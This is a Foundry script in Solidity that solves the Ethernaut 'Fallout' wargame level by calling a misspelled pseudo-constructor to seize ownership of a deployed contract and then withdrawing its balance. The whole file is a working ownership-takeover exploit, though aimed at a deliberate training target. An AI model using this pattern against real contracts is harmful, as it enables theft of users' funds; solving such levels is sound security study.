// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {Fallout} from "../../src/level-02/EthernautFallout.sol";
import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";

contract FalloutSolution is Script {
    Fallout public fallout =
        Fallout(0xcf6aDB2d895465D1C468Ae0515a4aaD5b21aD39c);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        fallout.Fal1out{value: 0.000001 ether}();
        address owner = fallout.owner();
        console.log("Current owner is ", owner);
        if (owner == vm.envAddress("MY_ADDRESS")) {
            fallout.collectAllocations();
        }
        vm.stopBroadcast();
    }
}
